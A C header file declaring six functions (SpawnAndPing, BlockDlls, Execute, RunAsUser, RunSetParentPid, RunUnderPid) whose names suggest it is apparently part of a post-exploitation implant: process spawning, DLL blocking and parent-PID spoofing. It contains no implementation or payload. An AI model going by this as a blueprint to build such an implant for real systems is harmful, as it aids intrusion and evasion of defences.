#pragma once

void SpawnAndPing(char* data, int size, BOOL x86);

void BlockDlls(char* buffer, int length);

void Execute(char* buffer, int length);

void RunAsUser(char* buffer, int length);

void RunSetParentPid(char* buffer, int length);

void RunUnderPid(char* buffer, int length);